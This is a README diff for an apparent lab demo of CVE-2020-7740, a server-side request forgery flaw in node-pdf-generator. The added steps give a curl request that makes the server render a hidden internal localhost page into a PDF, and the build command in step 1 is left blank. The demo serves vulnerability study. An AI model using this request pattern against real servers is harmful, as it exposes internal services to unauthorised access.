@@ -6,7 +6,14 @@ This affects all versions of package [`node-pdf-generator`](https://github.com/d
 [Source](https://nvd.nist.gov/vuln/detail/CVE-2020-7740)
 
 
-## Quick start
+## Quick start with docker
+1. Build the container with 
+2. Run the container with `docker run -p 3000:3000 cve-2020-7740`
+3. Notice that we cannot visit [`localhost:3001`](http://localhost:3001) directly
+4. Send the request with curl using `curl --location --request GET localhost:3000/test --data-raw http://localhost:3001 --output test.pdf`
+5. View `test.pdf` to view the localhost website that is supposed to be hidden.
+
+## Quick start Without docker
 1. Clone the project using `git clone {link to be inserted}`
 2. Install the dependencies from `https://wkhtmltopdf.org/`
 3. Start the server using `node .\node-pdf-generator-server` the server will be running at `localhost:3000`
